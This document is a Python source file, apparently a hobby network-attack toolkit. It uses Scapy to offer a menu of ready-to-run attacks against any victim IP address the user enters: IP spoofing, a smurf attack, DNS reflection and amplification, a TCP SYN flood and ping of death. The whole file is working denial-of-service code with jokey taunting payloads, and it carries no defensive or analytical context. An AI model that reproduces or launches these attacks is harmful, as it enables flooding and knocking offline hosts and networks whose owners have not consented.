#!/usr/bin/env python3

#Keep above line as first line always! Its a shebang

#To-do: Add Kaminsky's Bug

from Helpers import *
from GUI import *
from scapy.all import *
import os

def launch_attacks():
	print_attacks_menu()
	ch=0
	while True:  #get user input and validate
		a = input("Enter Sr No. of your choice: ")
		if(a == "1" or a == "2" or a == "3" or a == "4" or a == "5" or a=="6" or a=="7"):
			ch = int(a)
			break
		else:
			print("Invalid input! Please enter a valid one.")
	#Call function according to user choice
	if(ch == 1):
		os.system('clear')
		ip_spoofing()
	elif(ch == 2):
		os.system('clear')
		ip_smurf_attack()
	elif(ch==3):
		os.system('clear')
		dns_reflection_attack()
	elif(ch==4):
		os.system('clear')
		dns_amplification_attack()
	elif(ch==5):
		os.system('clear')
		tcp_synflood_attack()
	elif(ch==6):
		os.system('clear')
		ping_of_death()
	else:
		print_exit_message()

#ip spoof attack
def ip_spoofing():
	print("\t\t IP Spoofing \N{ghost}")
	print("-"*60)
	
	source_ip = input("Please enter the source IP address: ")
	#while not validate_ip(source_ip):
	#	source_ip = input("Invalid IP! Please enter a valid IP address..")

	dest_ip = input("Please enter the destination IP address: ")
	#while not validate_ip(dest_ip):
	#	dest_ip = input("Invalid IP! Please enter a valid IP address..")

	num_packets = get_packetCount_send()
	send( IP(src = source_ip, dst =dest_ip)/TCP()/"Spoofing You rn :)" , count = num_packets )
	print("\nIP Spoofing attack finished.")
	print("-"*60)

#ip smurf attack
def ip_smurf_attack():
	print("\t\t IP SMURF Attack \N{cyclone}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")

	num_packets = get_packetCount_send()
	send( IP(src = victim_ip, dst ='172.25.223.255')/ICMP() , count = num_packets )
	print("\nIP Smurfing attack finished.")
	print("-"*60)

#dns reflection attack
def dns_reflection_attack():
	print("\t\t DNS Reflection Attack \N{bomb}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")
	ns = get_nameserver()
	num_packets = get_packetCount_send()
	dns_ref = IP(src = victim_ip, dst = ns)/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "A"))

	send(dns_ref, count = num_packets)
	print("\nDNS Reflection attack concluded successfully.")
	print("-"*60)
	
#dns amplification attack, basically dns reflection with query type = 'ANY'
def dns_amplification_attack():
	print("\t\t DNS Amplification Attack \N{bomb}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")
	ns = get_nameserver()
	num_packets = get_packetCount_send()
	dns_amp = IP(src = victim_ip, dst = ns)/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "twitter.com", qtype = "ANY"))

	send(dns_amp, count = num_packets)
	print("\nDNS Amplification attack finished.")
	print("-"*60)
	
#TCP SYN flooding attack
def tcp_synflood_attack():
	print("\t\t TCP SYN Flooding Attack \N{water wave}")
	print("-"*60)
	#remaining code
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")

	num_packets = get_packetCount_send()
	syn_flood = IP(dst = victim_ip)/TCP(sport=RandShort(), dport= [80], seq=12345,ack=1000,window=1000,flags="S")/"Flooding you rn xD"
	
	ans,unans = srloop(syn_flood, inter=0.3, retry=1, timeout=4, count=num_packets)		#For live server
	# send(syn_flood, count = num_packets)		#Not live/ understand RST flag
	
	print("\nTCP SYN flood attack launched successfully.")
	print("-"*60)

#ping of death attack
def ping_of_death():
	print("\t\t Ping of Death \N{skull}")
	print("-"*60)
	victim_ip = input("Please enter the victim's IP address: ")
	#while not validate_ip(victim_ip):
	#	victim_ip = input("Invalid IP! Please enter a valid IP address..")

	send( fragment(IP(dst=victim_ip)/ICMP()/("Very big payload"*60000)) )
	print("\nPing of death carried out successfully.")
	print("-"*60)
